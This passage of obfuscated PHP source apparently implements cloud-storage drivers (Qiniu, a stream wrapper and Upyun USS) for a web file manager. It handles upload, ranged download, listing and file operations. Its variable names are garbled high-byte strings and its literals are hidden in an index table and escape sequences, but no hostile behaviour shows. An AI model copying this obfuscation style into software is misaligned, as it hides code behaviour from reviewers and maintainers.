= $ÄıåÒà->refreshUrls($ ’»½¦Î); if ($öÁŸ‚ûÇ) { return !1; } return $¤šÀ´ò[$»ê¼øÉ¡[1253]] == $»ê¼øÉ¡[824] ? !0 : !1; } public function fileSubstr($û’è€ìŞ, $éëÕşÅÃ, $ÒÉÒûÕ) { $œø£Ò·â =& $_SERVER[ü¢ÙÊñÛ]; if (!($ˆÄ Êû  = $this->link($û’è€ìŞ))) { return !1; } $Íïˆçîø = !1; if ($ÒÉÒûÕ > 0) { $Ï¨µÖğ = $éëÕşÅÃ + $ÒÉÒûÕ - 1; $Íïˆçîø = array($œø£Ò·â[1525] . $éëÕşÅÃ . $œø£Ò·â[473] . $Ï¨µÖğ); } $ÇØ¼¤ = url_request($ˆÄ Êû , $œø£Ò·â[1485], !1, $Íïˆçîø); return $ÇØ¼¤[$œø£Ò·â[815]] ? $ÇØ¼¤[$œø£Ò·â[1276]] : !1; } public function upload($äé÷™×, $Ì™‰ıªì, $ïşÒ¿©¬ = false, $¨ïä§ˆÆ = REPEAT_REPLACE) { $ò¦Œ»ìÄ = new Qiniu\Storage\UploadManager(); $şè­†‡ = $this->auth->uploadToken($this->bucket, $äé÷™×); $ŠÖí»ºê = get_file_mime(get_path_ext($Ì™‰ıªì)); list($Ää¡¼¡Ş, $ÒÈ‰¡ª³) = $ò¦Œ»ìÄ->putFile($şè­†‡, $äé÷™×, $Ì™‰ıªì, null, $ŠÖí»ºê); return $ÒÈ‰¡ª³ ? !1 : $this->getPathOuter($äé÷™×); } public function uploadFormData($Îíº¸ÉË, $¼ÛÄ´çÒ = 3600) { return $this->uploadToken($Îíº¸ÉË, $¼ÛÄ´çÒ); } public function uploadMultiData($ĞĞäÙ¡, $­ıöÊü• = 3600) { return $this->uploadToken($ĞĞäÙ¡, $­ıöÊü•); } private function uploadToken($şË¿² , $ã…ı²åÚ = 3600) { $ºëÀÑŒ =& $_SERVER[ü¢ÙÊñÛ]; $‰´Õ¶Úï = $ã…ı²åÚ; $·Ö™¼È = array($ºëÀÑŒ[1526] => $ºëÀÑŒ[1527]); $Ä±Æƒú¿ = $şË¿² ; $»Éğ¿®– = $this->auth->uploadToken($this->bucket, $Ä±Æƒú¿, $‰´Õ¶Úï, $·Ö™¼È, !0); $âŞğàõ = empty($this->region) || $this->region == $ºëÀÑŒ[1528] ? $ºëÀÑŒ[22] : $ºëÀÑŒ[473] . $this->region; $üãÅ = http_type() . "\72\57\x2f\x75\160\154\157\x61\144{$âŞğàõ}\56\161\x69\x6e\151\x75\160\56\x63\157\155\x2f"; return array($ºëÀÑŒ[1529] => $»Éğ¿®–, $ºëÀÑŒ[1530] => $üãÅ); } public function download($Õ‡Ú©½á, $¶¡ßĞå) { $°ñ»ÍÇõ = IO::getPathInner(IO::mkfile($¶¡ßĞå)); if (!($Æï©á– = $this->link($Õ‡Ú©½á))) { return !1; } $¤§ÖéÎ = 0; $Å«‘¾ıÛ = 1024 * 200; $Ç…¤ƒ = fopen($°ñ»ÍÇõ, $_SERVER[ü¢ÙÊñÛ][1531]); while (!0) { $Ÿ„†ß‡á = $this->fileSubstr($Õ‡Ú©½á, $¤§ÖéÎ, $Å«‘¾ıÛ); if ($Ÿ„†ß‡á === !1) { return !1; } fwrite($Ç…¤ƒ, $Ÿ„†ß‡á); $¤§ÖéÎ += $Å«‘¾ıÛ; if (strlen($Ÿ„†ß‡á) < $Å«‘¾ıÛ) { break; } } fclose($Ç…¤ƒ); return $¶¡ßĞå; } public function link($ÒÕ—ƒøû, $¯…˜¸Ã = '') { if (!$this->isFile($ÒÕ—ƒøû)) { return !1; } $Ñ¬‹‰¨‚ = $this->getHost() . $_SERVER[ü¢ÙÊñÛ][18] . $this->pathEncode($ÒÕ—ƒøû) . $¯…˜¸Ã; return $this->auth->privateDownloadUrl($Ñ¬‹‰¨‚, 3600 * 12); } public function fileOut($èè¦‘Úæ, $ÌÖ¿Ü†Æ = false, $ĞÔ´¨‹° = false, $ÕÙÁï¸´ = '') { $úì×÷±÷ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->isFileOutServer()) { return $this->fileOutServer($èè¦‘Úæ, $ÌÖ¿Ü†Æ, $ĞÔ´¨‹°, $ÕÙÁï¸´); } if (!$ĞÔ´¨‹°) { $ĞÔ´¨‹° = $this->pathThis($èè¦‘Úæ); } $„æİ–â¯ = $ÌÖ¿Ü†Æ ? $úì×÷±÷[1532] . rawurlencode($ĞÔ´¨‹°) : $úì×÷±÷[22]; $şÚ€è¾ = $this->link($èè¦‘Úæ, $„æİ–â¯); $this->fileOutLink($şÚ€è¾); } public function fileOutServer($øÇ›ı§, $òÀ£Ò±ã = false, $Âø•­—Ò = false, $ï¯ş×İÙ = '') { parent::fileOut($øÇ›ı§, $òÀ£Ò±ã, $Âø•­—Ò, $ï¯ş×İÙ); } public function fileOutImage($¦ÛÈĞŒ, $×ºáÙƒ° = 250) { if ($this->size($¦ÛÈĞŒ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¦ÛÈĞŒ, $×ºáÙƒ°); } $È¤‰ÊÇÛ = $this->link($¦ÛÈĞŒ, $_SERVER[ü¢ÙÊñÛ][1533] . $×ºáÙƒ°); $this->fileOutLink($È¤‰ÊÇÛ); } public function fileOutImageServer($¿º¢ÆôÏ, $Ô–ıÍ…Î = 250) { parent::fileOutImage($¿º¢ÆôÏ, $Ô–ıÍ…Î); } public function hashMd5($Ôİ¢­Ê’) { $êƒÖü‘Œ =& $_SERVER[ü¢ÙÊñÛ]; $ıî¤á¨® = $this->objectMeta($Ôİ¢­Ê’); return isset($ıî¤á¨®[$êƒÖü‘Œ[258]]) ? $ıî¤á¨®[$êƒÖü‘Œ[258]] : !1; $Û‰ö®²Ë = $this->link($Ôİ¢­Ê’, $êƒÖü‘Œ[1534]); } public function size($‹ƒÎä¯¡) { $ˆí¤¤åÏ = $this->objectMeta($‹ƒÎä¯¡); return $ˆí¤¤åÏ ? $ˆí¤¤åÏ[$_SERVER[ü¢ÙÊñÛ][90]] : 0; } public function info($æÖ¾˜óé) { if ($this->isFolder($æÖ¾˜óé)) { return $this->folderInfo($æÖ¾˜óé); } else { if ($this->isFile($æÖ¾˜óé)) { return $this->fileInfo($æÖ¾˜óé); } } return !1; } public function exist($‰´¢¾Û) { return $this->isFile($‰´¢¾Û) || $this->isFolder($‰´¢¾Û); } public function isFile($‡¥«’§Æ) { return !$this->isFolder($‡¥«’§Æ) && $this->objectMeta($‡¥«’§Æ); } public function isFolder($çœÓƒ„©) { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][190], $çœÓƒ„©); } protected function objectMeta($ŠšïÙú) { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][192], $ŠšïÙú); } protected function _objectMeta($©ÔÜ §ˆ) { $¹Ãï³ê¹ =& $_SERVER[ü¢ÙÊñÛ]; list($µËÙáË, $ÆıèŸ‘) = $this->bucketManager->stat($this->bucket, $©ÔÜ §ˆ); if ($µËÙáË) { $µËÙáË[$¹Ãï³ê¹[90]] = intval($µËÙáË[$¹Ãï³ê¹[1520]]); } return $µËÙáË; } protected function _isFolder($²€šôÄ™) { $‚‹¯Ü£± =& $_SERVER[ü¢ÙÊñÛ]; if ($²€šôÄ™ == $‚‹¯Ü£±[22] || $²€šôÄ™ == $‚‹¯Ü£±[18]) { return !0; } list($èêøº™¥, $Õø•ñÚê) = $this->bucketManager->listFiles($this->bucket, trim($²€šôÄ™, $‚‹¯Ü£±[18]) . $‚‹¯Ü£±[18], $‚‹¯Ü£±[22], 1, $‚‹¯Ü£±[18]); return !empty($èêøº™¥[$‚‹¯Ü£±[1523]]) || !empty($èêøº™¥[$‚‹¯Ü£±[1524]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ñÈ—š÷, $òĞÏ“´ö = 0) { parent::__construct(); $this->source = $ñÈ—š÷; $this->sourceSize = $òĞÏ“´ö; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($†ç™ÆáĞ = false) { return $this->sourceSize; } public function getContent($‚»­Ä…Ä = false) { return $this->fileSubstr($‚»­Ä…Ä, 0, $this->sourceSize); } public function fileSubstr($ÈĞûÒëÎ = false, $åÕıõ‹ = 0, $¬ÃÔ¬úß = 0) { if (!$¬ÃÔ¬úß) { $¬ÃÔ¬úß = $this->sourceSize; } $›Ş† » = $this->sourceSize - $åÕıõ‹; if ($¬ÃÔ¬úß >= $›Ş† ») { $¬ÃÔ¬úß = $›Ş† »; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $åÕıõ‹, $¬ÃÔ¬úß); } if ($this->sourceType == self::TYPE_FILE) { if ($¬ÃÔ¬úß <= 0) { return $_SERVER[ü¢ÙÊñÛ][22]; } $€—¶¦Ë = ftell($this->source); fseek_64($this->source, $€—¶¦Ë + $åÕıõ‹); $ÕÕ‚˜Ÿö = @fread($this->source, $¬ÃÔ¬úß); fseek_64($this->source, $€—¶¦Ë); return $ÕÕ‚˜Ÿö; } } public function hashMd5($—£şâÚ = false) { return md5($this->getContent()); } public static function hash($ÇåÙæŸÑ, $ª‘Ş¼¿ = 0) { $ÕµĞ²š‰ = new PathDriverStream($ÇåÙæŸÑ, $ª‘Ş¼¿); return $ÕµĞ²š‰->hashSimple($ÇåÙæŸÑ); } public static function md5($…ÜÑÓ , $ÓÁøØµ = 0) { $ã§ºÙ´ù = new PathDriverStream($…ÜÑÓ , $ÓÁøØµ); return $ã§ºÙ´ù->hashMd5($…ÜÑÓ ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\72\57\x2f\166\60\56\141\160\151\x2e\165\160\171\165\156\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($úÒûâŸ°) { parent::__construct(); $this->_init($úÒûâŸ°); } public function _init($¿«°‚Ã) { $ƒîùÆ£¦ =& $_SERVER[ü¢ÙÊñÛ]; foreach ($¿«°‚Ã as $Äçñ€« => $·¢«ÄçÑ) { if (isset($this->{$Äçñ€«})) { $this->{$Äçñ€«} = $·¢«ÄçÑ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ƒîùÆ£¦[1535] . LNG($ƒîùÆ£¦[1454])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ßú‡¹¥÷, $È–«ÓƒÅ = "\x47\105\124") { $±‚šêõ× =& $_SERVER[ü¢ÙÊñÛ]; $¬¨ÌúÜæ = gmdate($±‚šêõ×[1483]); $šÇˆæ = base64_encode(hash_hmac($±‚šêõ×[1536], "{$È–«ÓƒÅ}\x26{$ßú‡¹¥÷}\x26{$¬¨ÌúÜæ}", md5("{$this->userpass}"), !0)); $‰‘©øÒ = array("\101\x75\x74\150\x6f\162\x69\x7a\x61\x74\x69\x6f\x6e\x3a\125\120\x59\125\x4e\x20{$this->username}\x3a{$šÇˆæ}", "\x44\x61\x74\145\x3a{$¬¨ÌúÜæ}"); return $‰‘©øÒ; } public function ussRequest($¶Ç¦´½¥, $„öóëöæ = "\107\105\x54", $½Ôõé = false, $Èœö„˜Û = false, $ğóùøå = false) { $®Ã²¥½± =& $_SERVER[ü¢ÙÊñÛ]; $¶Ç¦´½¥ = trim($¶Ç¦´½¥, $®Ã²¥½±[18]); $×±éŠ™³ = "\x2f{$this->bucket}\57" . rawurlencode($¶Ç¦´½¥); $ƒØİ•™á = $this->ussHeaders($×±éŠ™³, $„öóëöæ); if ($Èœö„˜Û) { $ƒØİ•™á = array_merge($ƒØİ•™á, $Èœö„˜Û); } $¼ÓÅñŞ¬ = url_request($this->endpoint . $×±éŠ™³, $„öóëöæ, $½Ôõé, $ƒØİ•™á, $ğóùøå); if (!$¼ÓÅñŞ¬) { $×¬Óœı† = LNG($®Ã²¥½±[1537]); $this->writeLog($×¬Óœı†); return array($®Ã²¥½±[1286] => !1, $®Ã²¥½±[1276] => $×¬Óœı†); } if (strtolower($„öóëöæ) == $®Ã²¥½±[240] || in_array($¼ÓÅñŞ¬[$®Ã²¥½±[1286]], array($®Ã²¥½±[274], $®Ã²¥½±[1538]))) { $½Ôõé = $¼ÓÅñŞ¬[$®Ã²¥½±[1539]]; if (!$¼ÓÅñŞ¬[$®Ã²¥½±[815]]) { $½Ôõé = isset($½Ôõé[0]) ? $½Ôõé[0] : $®Ã²¥½±[22]; } } else { $½Ôõé = json_decode($¼ÓÅñŞ¬[$®Ã²¥½±[1276]], !0); if (!$½Ôõé) { $½Ôõé = $¼ÓÅñŞ¬[$®Ã²¥½±[1276]]; } else { if (!$¼ÓÅñŞ¬[$®Ã²¥½±[815]] && isset($½Ôõé[$®Ã²¥½±[1540]])) { $½Ôõé = $½Ôõé[$®Ã²¥½±[1540]]; } } } if (!$¼ÓÅñŞ¬[$®Ã²¥½±[815]]) { $this->writeLog($this->__errorMessage($½Ôõé)); } return array($®Ã²¥½±[1286] => $¼ÓÅñŞ¬[$®Ã²¥½±[815]], $®Ã²¥½±[1276] => $½Ôõé); } private function __errorMessage($ÖÕ»éÊ–) { $şã£´ğê =& $_SERVER[ü¢ÙÊñÛ]; if (!$ÖÕ»éÊ–) { return $şã£´ğê[22]; } static $Í¤Öàæç = null; if (!$Í¤Öàæç) { $Í¤Öàæç = I18n::getType(); } if ($Í¤Öàæç != $şã£´ğê[1493]) { return $ÖÕ»éÊ–; } $µÇ…¡Ë = array($şã£´ğê[1541] => $şã£´ğê[1542], $şã£´ğê[1543] => $şã£´ğê[1544], $şã£´ğê[1545] => $şã£´ğê[1544], $şã£´ğê[1546] => $şã£´ğê[1547], $şã£´ğê[1548] => $şã£´ğê[1549], $şã£´ğê[1550] => $şã£´ğê[1551], $şã£´ğê[1552] => $şã£´ğê[1553]); return isset($µÇ…¡Ë[$ÖÕ»éÊ–]) ? $µÇ…¡Ë[$ÖÕ»éÊ–] : $ÖÕ»éÊ–; } public function mkfile($¬ü³ùëÌ, $¬½øÆÀ° = '', $ÉÓ…Óø = REPEAT_RENAME) { if ($this->setContent($¬ü³ùëÌ, $¬½øÆÀ°)) { return $this->getPathOuter($¬ü³ùëÌ); } return !1; } public function mkdir($­ˆÍæ·÷, $ÌØ›¢Õ† = REPEAT_SKIP) { $ä×õíğ• =& $_SERVER[ü¢ÙÊñÛ]; $ÕÍÓšÖÄ = trim($­ˆÍæ·÷, $ä×õíğ•[18]); if ($this->_isFolder($ÕÍÓšÖÄ)) { return $this->getPathOuter($ÕÍÓšÖÄ); } $ÓÄùô’“ = array($ä×õíğ•[1554]); $¢Ş‚ñ—Ù = $this->ussRequest($ÕÍÓšÖÄ, $ä×õíğ•[300], !1, $ÓÄùô’“); return $¢Ş‚ñ—Ù[$ä×õíğ•[1286]] ? $this->getPathOuter($ÕÍÓšÖÄ) : !1; } public function copyFile($”¥ì’ÀÚ, $½’öšü²) { $İ¶œ­¸Ü =& $_SERVER[ü¢ÙÊñÛ]; $¥Ëçİäù = array($İ¶œ­¸Ü[1555] . "\x2f{$this->bucket}\x2f{$”¥ì’ÀÚ}", $İ¶œ­¸Ü[1556]); $º¢†ÏÀ… = $this->ussRequest($½’öšü², $İ¶œ­¸Ü[266], !1, $¥Ëçİäù); return $º¢†ÏÀ…[$İ¶œ­¸Ü[1286]] ? !0 : $this->getPathOuter($½’öšü²); } public function moveFile($Ğ‹ÃçÔ, $ĞèÀ«š„) { $³Í­ÀúĞ =& $_SERVER[ü¢ÙÊñÛ]; $øˆÂüÖï = array($³Í­ÀúĞ[1557] . "\57{$this->bucket}\57{$Ğ‹ÃçÔ}", $³Í­ÀúĞ[1556]); $“£Ã¨à = $this->ussRequest($ĞèÀ«š„, $³Í­ÀúĞ[266], !1, $øˆÂüÖï); return $“£Ã¨à[$³Í­ÀúĞ[1286]] ? !0 : $this->getPathOuter($ĞèÀ«š„); } public function delFile($ş‘ÁÚ”«) { $Ş…À›‹ˆ =& $_SERVER[ü¢ÙÊñÛ]; $ûŒã¾Ù… = $this->ussRequest($ş‘ÁÚ”«, $Ş…À›‹ˆ[1558]); return $ûŒã¾Ù…[$Ş…À›‹ˆ[1286]] ? !0 : !1; } public function delFolder($¶í×Ç½À) { $×¶Ä‘¢» =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->exist($¶í×Ç½À)) { return !0; } $this->listItemCache = !1; $ò›¹Œ´ = $´ãÏŒá° = array(); $this->fileList($¶í×Ç½À, $ò›¹Œ´, $´ãÏŒá°, !0); $this->listItemCache = !0; foreach ($´ãÏŒá° as $óòœíîï) { $¬İûõöñ = $this->ussRequest($óòœíîï[$×¶Ä‘¢»[42]], $×¶Ä‘¢»[1558]); if (!$¬İûõöñ[$×¶Ä‘¢»[1286]]) { return !1; } } usort($ò›¹Œ´, function ($ÑÈŞ»çÖ, $ õôê¹ç) { $¦„‹›Ï® =& $_SERVER[ü¢ÙÊñÛ]; return substr_count($ õôê¹ç, $¦„‹›Ï®[18]) - substr_count($ÑÈŞ»çÖ, $¦„‹›Ï®[18]); }); foreach ($ò›¹Œ´ as $Ø¾–) { $¬İûõöñ = $this->ussRequest($Ø¾–, $×¶Ä‘¢»[1558]); if (!$¬İûõöñ[$×¶Ä‘¢»[1286]]) { return !1; } } $¬İûõöñ = $this->ussRequest($¶í×Ç½À, $×¶Ä‘¢»[1558]); return $¬İûõöñ[$×¶Ä‘¢»[1286]]; } public function rename($¡±‰¿­Å, $ô£¶Ç¿·) { if ($this->isFile($¡±‰¿­Å)) { $ô£¶Ç¿· = get_path_father($¡±‰¿­Å) . $ô£¶Ç¿·; return $this->moveFile($¡±‰¿­Å, $ô£¶Ç¿·); } return $this->renameObject($¡±‰¿­Å, $ô£¶Ç¿·); } public function fileInfo($Ğ¢Ñª°, $íÛÖ½· = false, $á°¼¤¤˜ = array()) { $•’½…îé =& $_SERVER[ü¢ÙÊñÛ]; $ËÄ²Ú¬Û = array($•’½…îé[42] => $this->pathThis($Ğ¢Ñª°), $•’½…îé[98] => $this->getPathOuter($•’½…îé[18] . $Ğ¢Ñª°), $•’½…îé[43] => $•’½…îé[243], $•’½…îé[90] => isset($á°¼¤¤˜[$•’½…îé[90]]) ? $á°¼¤¤˜[$•’½…îé[90]] : 0, $•’½…îé[180] => $this->ext($Ğ¢Ñª°)); if ($íÛÖ½·) { return $ËÄ²Ú¬Û; } $ËÄ²Ú¬Û[$•’½…îé[244]] = $ËÄ²Ú¬Û[$•’½…îé[99]] = 0; $ËÄ²Ú¬Û[$•’½…îé[245]] = $ËÄ²Ú¬Û[$•’½…îé[246]] = !0; if (empty($á°¼¤¤˜)) { $á°¼¤¤˜ = $this->objectMeta($Ğ¢Ñª°); if (!$á°¼¤¤˜) { return $ËÄ²Ú¬Û; } } $ËÄ²Ú¬Û[$•’½…îé[244]] = intval($á°¼¤¤˜[$•’½…îé[1559]]); $ËÄ²Ú¬Û[$•’½…îé[99]] = intval($á°¼¤¤˜[$•’½…îé[1560]]); $ËÄ²Ú¬Û[$•’½…îé[90]] = $á°¼¤¤˜[$•’½…îé[90]]; return $ËÄ²Ú¬Û; } public function folderInfo($¾”“†Şâ, $ò•ú¬Ñë = false) { $‚¬ŠØÉ =& $_SERVER[ü¢ÙÊñÛ]; $ËÊ¼Å‰Ñ = array($‚¬ŠØÉ[42] => $this->pathThis($¾”“†Şâ), $‚¬ŠØÉ[98] => $this->getPathOuter($‚¬ŠØÉ[18] . $¾”“†Şâ), $‚¬ŠØÉ[43] => $‚¬ŠØÉ[89]); if ($ò•ú¬Ñë) { return $ËÊ¼Å‰Ñ; } $ËÊ¼Å‰Ñ[$‚¬ŠØÉ[244]] = $ËÊ¼Å‰Ñ[$‚¬ŠØÉ[99]] = 0; $ËÊ¼Å‰Ñ[$‚¬ŠØÉ[245]] = $ËÊ¼Å‰Ñ[$‚¬ŠØÉ[246]] = !0; if (empty($Ó™µ­÷‚)) { $Ó™µ­÷‚ = $this->objectMeta($¾”“†Şâ); if (!$Ó™µ­÷‚) { return $ËÊ¼Å‰Ñ; } } $ËÊ¼Å‰Ñ[$‚¬ŠØÉ[244]] = intval($Ó™µ­÷‚[$‚¬ŠØÉ[1559]]); $ËÊ¼Å‰Ñ[$‚¬ŠØÉ[99]] = intval($Ó™µ­÷‚[$‚¬ŠØÉ[1560]]); return $ËÊ¼Å‰Ñ; } private function listObjs($Ë¦š°­§, $§¹€ï¯Î = 0, $¬ˆŞµµœ = 1000) { $²ÒÙÜùº =& $_SERVER[ü¢ÙÊñÛ]; $¹×˜–Œ™ = array($²ÒÙÜùº[1561], $²ÒÙÜùº[1562] . $¬ˆŞµµœ); if ($§¹€ï¯Î) { $¹×˜–Œ™[] = $²ÒÙÜùº[1563] . $§¹€ï¯Î; } $¢¶­¶ù£ = $this->ussRequest($Ë¦š°­§, $²ÒÙÜùº[1485], !1, $¹×˜–Œ™); return !$¢¶­¶ù£[$²ÒÙÜùº[1286]] ? !1 : $¢¶­¶ù£[$²ÒÙÜùº[1276]]; } private function fileList($À†ü¥í®, &$¹Ê¤¸ Š, &$¬”Š«Áï, $§¨ ÂÖ‡ = false) { $éĞ¡ì¡á =& $_SERVER[ü¢ÙÊñÛ]; $²¨Îºßµ = $éĞ¡ì¡á[22]; $©Œ„¿ÓÚ = 1000; $®¦ªé¬¤ = rtrim($À†ü¥í®, $éĞ¡ì¡á[18]) . $éĞ¡ì¡á[18]; while (!0) { check_abort(); $ğÌÓ½×Ó = $this->listObjs($À†ü¥í®, $²¨Îºßµ, $©Œ„¿ÓÚ); if (!$ğÌÓ½×Ó) { return !1; } $²¨Îºßµ = isset($ğÌÓ½×Ó[$éĞ¡ì¡á[1564]]) ? $ğÌÓ½×Ó[$éĞ¡ì¡á[1564]] : $éĞ¡ì¡á[22]; $¼ãâ×“Í = isset($ğÌÓ½×Ó[$éĞ¡ì¡á[1565]]) ? $ğÌÓ½×Ó[$éĞ¡ì¡á[1565]] : array(); foreach ($¼ãâ×“Í as $¼Ö€ÂŸ) { $²é¿õŠ£ = $¼Ö€ÂŸ[$éĞ¡ì¡á[43]] == $éĞ¡ì¡á[89] ? !0 : !1; $…À—’Õ– = ltrim($®¦ªé¬¤ . $¼Ö€ÂŸ[$éĞ¡ì¡á[42]], $éĞ¡ì¡á[18]) . ($²é¿õŠ£ ? $éĞ¡ì¡á[18] : $éĞ¡ì¡á[22]); $ù’Ëîşï = array($éĞ¡ì¡á[42] => $…À—’Õ–, $éĞ¡ì¡á[43] => $²é¿õŠ£ ? $éĞ¡ì¡á[89] : $éĞ¡ì¡á[243], $éĞ¡ì¡á[90] => $¼Ö€ÂŸ[$éĞ¡ì¡á[424]], $éĞ¡ì¡á[1560] => $¼Ö€ÂŸ[$éĞ¡ì¡á[1566]]); $this->cacheMethodInfoSet($…À—’Õ–, $²é¿õŠ£, $ù’Ëîşï); if ($²é¿õŠ£) { $¹Ê¤¸ Š[] = $…À—’Õ–; if ($§¨ ÂÖ‡) { $this->fileList($…À—’Õ–, $¹Ê¤¸ Š, $¬”Š«Áï, $§¨ ÂÖ‡); } continue; } $¬”Š«Áï[] = $ù’Ëîşï; } if (count($¼ãâ×“Í) < $©Œ„¿ÓÚ) { break; } } $this->cacheMethodInfoSet($À†ü¥í®, !0); } public function listPath($åÛùøÀŸ, $‰ª¿ÖÚÖ = false) { $öÕ²€Ò =& $_SERVER[ü¢ÙÊñÛ]; $š¾¹€‹  = $Ğ‚òòÊ = array(); $this->fileList($åÛùøÀŸ, $š¾¹€‹ , $Ğ‚òòÊ); foreach ($š¾¹€‹  as $–¦¯úÙû => $Ì£»«•¶) { $š¾¹€‹ [$–¦¯úÙû] = $this->folderInfo($Ì£»«•¶, $‰ª¿ÖÚÖ); } foreach ($Ğ‚òòÊ as $–¦¯úÙû => $Ì£»«•¶) { $Ğ‚òòÊ[$–¦¯úÙû] = $this->fileInfo($Ì£»«•¶[$öÕ²€Ò[42]], $‰ª¿ÖÚÖ, $Ì£»«•¶); } return array($öÕ²€Ò[96] => $š¾¹€‹ , $öÕ²€Ò[97] => $Ğ‚òòÊ); } public function has($—§‘“Ş», $†Á·ªóõ = false, $œÀ“¥óã = true) { $†Œâ©ÆÃ =& $_SERVER[ü¢ÙÊñÛ]; $Ê¶Ö‹¬— = $†Œâ©ÆÃ[22]; $ÔªÌÃ = 500; $ÛÑø”ô = 0; $ŞËµñš = 0; $ô…ãÖ« = rtrim($—§‘“Ş», $†Œâ©ÆÃ[18]) . $†Œâ©ÆÃ[18]; while (!0) { check_abort(); $ÙÆÍ…¼Î = $this->listObjs($—§‘“Ş», $Ê¶Ö‹¬—, $ÔªÌÃ); if (!$ÙÆÍ…¼Î) { return !1; } $Ê¶Ö‹¬— = isset($ÙÆÍ…¼Î[$†Œâ©ÆÃ[1564]]) ? $ÙÆÍ…¼Î[$†Œâ©ÆÃ[1564]] : $†Œâ©ÆÃ[22]; $ÌŞˆğ¸ş = isset($ÙÆÍ…¼Î[$†Œâ©ÆÃ[1565]]) ? $ÙÆÍ…¼Î[$†Œâ©ÆÃ[1565]] : array(); if (empty($ÌŞˆğ¸ş)) { break; } $¾ûæÀ¬Ó = array_filter($ÌŞˆğ¸ş, function ($ƒŸ®éîÖ) { $Ñâ‚²•é =& $_SERVER[ü¢ÙÊñÛ]; return $ƒŸ®éîÖ[$Ñâ‚²•é[43]] == $Ñâ‚²•é[89]; }); $×‡Æ¦• = count($ÌŞˆğ¸ş); $¾ûæÀ¬Ó = count($¾ûæÀ¬Ó); $ƒÓ¯óïË = $×‡Æ¦• - $¾ûæÀ¬Ó; if ($†Á·ªóõ) { $ŞËµñš += $¾ûæÀ¬Ó; $ÛÑø”ô += $ƒÓ¯óïË; if ($×‡Æ¦• < $ÔªÌÃ) { break; } continue; } if ($œÀ“¥óã) { if ($ƒÓ¯óïË) { return !0; } } else { if ($¾ûæÀ¬Ó) { return !0; } } if ($×‡Æ¦• < $ÔªÌÃ) { break; } } if ($†Á·ªóõ) { return array($†Œâ©ÆÃ[252] => $ÛÑø”ô, $†Œâ©ÆÃ[253] => $ŞËµñš); } return !1; } public function listAll($“ñ®²Ù¬) { $”Ôæ˜ Š =& $_SERVER[ü¢ÙÊñÛ]; $ÊÂƒÀµÃ = $€è³Ê×² = array(); $this->fileList($“ñ®²Ù¬, $ÊÂƒÀµÃ, $€è³Ê×², !0); $ ø¯°ş“ = array_to_keyvalue($€è³Ê×², $”Ôæ˜ Š[42]); foreach ($ÊÂƒÀµÃ as $›äÌî³•) { if (is_string($›äÌî³•)) { $ ø¯°ş“[$›äÌî³•] = array($”Ôæ˜ Š[90] => 0); } } return $this->listAllFiles($“ñ®²Ù¬, $ ø¯°ş“); } public function canRead($ø¶ùˆÔé) { return $this->exist($ø¶ùˆÔé) ? !0 : !1; } public function canWrite($ıàñ–ò¦) { return $this->exist($ıàñ–ò¦) ? !0 : !1; } public function getContent($éÚó²é¨) { return $this->fileSubstr($éÚó²é¨, 0, -1); } public function setContent($Şî“É¹², $Ğä–¦ó = '') { $³ùÒîœ£ =& $_SERVER[ü¢ÙÊñÛ]; if (!$Ğä–¦ó) { $ğ¹¨ôª = $this->ussRequest($Şî“É¹², $³ùÒîœ£[300]); return $ğ¹¨ôª[$³ùÒîœ£[1286]]; } $ÖòÁÛİß = $this->tempFile($this->pathThis($Şî“É¹²)); file_put_contents($ÖòÁÛİß, $Ğä–¦ó); if ($this->upload($Şî“É¹², $ÖòÁÛİß)) { $this->tempFileRemve($ÖòÁÛİß); return !0; } return !1; } public function fileSubstr($¨‹ëéşÛ, $å‚†»™É, $¥â»õ§) { $§™Åù» =& $_SERVER[ü¢ÙÊñÛ]; if (!($Æ—…È¨Ì = $this->link($¨‹ëéşÛ))) { return !1; } $©¨¥¨çæ = !1; if ($¥â»õ§ > 0) { $åŸï­ğ… = $å‚†»™É + $¥â»õ§ - 1; $©¨¥¨çæ = array($§™Åù»[1525] . $å‚†»™É . $§™Åù»[473] . $åŸï­ğ…); } $èÎâİê¹ = url_request($Æ—…È¨Ì, $§™Åù»[1485], !1, $©¨¥¨çæ); return $èÎâİê¹[$§™Åù»[815]] ? $èÎâİê¹[$§™Åù»[1276]] : !1; } public function upload($Üæšôú®, $ ì…ã¤õ, $­ÄÍæ­Î = false, $ÛÖÂÔ¡ = REPEAT_REPLACE) { $’‡œ€½ =& $_SERVER[ü¢ÙÊñÛ]; $¶ÊÛ˜²” = IO::size($ ì…ã¤õ); if ($¶ÊÛ˜²” <= 1024 * 1024 * 200) { $Ëéà¾‚ş = array($’‡œ€½[1567] . $ ì…ã¤õ); $«‡†ŒÙô = $this->ussRequest($Üæšôú®, $’‡œ€½[266], $Ëéà¾‚ş); return $«‡†ŒÙô[$’‡œ€½[1286]] ? $this->getPathOuter($Üæšôú®) : !1; } $ÊŸş‹ÃË = 1024 * 1024 * 10; $ÄêçëÄ = array($’‡œ€½[1568], $’‡œ€½[1569] . $¶ÊÛ˜²”, $’‡œ€½[1570], $’‡œ€½[1571] . $ÊŸş‹ÃË); $«‡†ŒÙô = $this->ussRequest($Üæšôú®, $’‡œ€½[266], !1, $ÄêçëÄ); if (!$«‡†ŒÙô[$’‡œ€½[1286]]) { return !1; } $ÃîïØÆ = $«‡†ŒÙô[$’‡œ€½[1276]]; $´¨Öñã† = 0; $Ø¥„Ò¿ö = $ÃîïØÆ[$’‡œ€½[1572]]; $ìŞñöö¸ = fopen($ ì…ã¤õ, $’‡œ€½[1448]); if (!$ìŞñöö¸) { return !1; } do { $¨á±Ÿ”¯ = $ÃîïØÆ[$’‡œ€½[1573]]; 